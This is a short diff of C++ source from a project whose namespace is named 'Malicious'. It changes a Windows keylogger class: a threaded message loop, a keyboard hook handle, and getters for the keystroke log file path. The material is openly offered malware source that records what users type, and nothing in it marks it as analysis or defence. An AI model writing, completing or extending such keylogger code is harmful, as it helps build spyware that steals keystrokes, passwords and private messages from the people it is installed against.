@@ -128,8 +128,11 @@ namespace Malicious
         return next;
     }
 	
-	Keylogger::Keylogger()
-        :isActivated(false), window("undefined")
+	Keylogger::Keylogger() : 
+		Thread((LPTHREAD_START_ROUTINE)MsgLoop),
+		isActivated(false), 
+		window("undefined"),
+		hook(0)
 	{
 	}
 	
@@ -145,6 +148,16 @@ namespace Malicious
 		}
 	}
 	
+	const std::string& Keylogger::getKeylogPath()
+	{
+		return log_file;
+	}
+
+	HHOOK Keylogger::getHook()
+	{
+		return hook;
+	}
+
 	void Keylogger::clearKeylog()
 	{
 	    remove(log_file.c_str());
@@ -167,7 +180,7 @@ namespace Malicious
     {
         TRACE_FUNCTION
         // on ne démarre le keylogger uniquement s'il n'est pas déjà actif
-        Thread::start((LPTHREAD_START_ROUTINE)MsgLoop);
+        Thread::start();
         LOG << "Keylogging enabled";
     }
             
